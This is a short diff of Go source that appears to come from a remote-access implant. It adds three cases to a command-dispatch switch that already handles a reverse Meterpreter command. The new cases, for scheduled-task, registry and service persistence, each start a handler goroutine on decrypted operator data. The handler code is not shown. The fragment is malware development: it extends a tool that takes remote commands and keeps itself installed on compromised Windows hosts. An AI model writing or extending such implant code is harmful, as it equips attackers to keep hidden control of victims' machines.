@@ -112,6 +112,15 @@ func Start() {
 			case "reverseMeterpreter":
 				go reverseMeterpreterCmd(sendUserId, decData)
 				break
+			case "persistTaskschAdd":
+				go persistTaskschCmd(sendUserId, decData)
+				break
+			case "persistRegistryAdd":
+				go persistRegistryCmd(sendUserId, decData)
+				break
+			case "persistSvcAdd":
+				go persistSvcCmd(sendUserId, decData)
+				break
 			default:
 				break
 			}
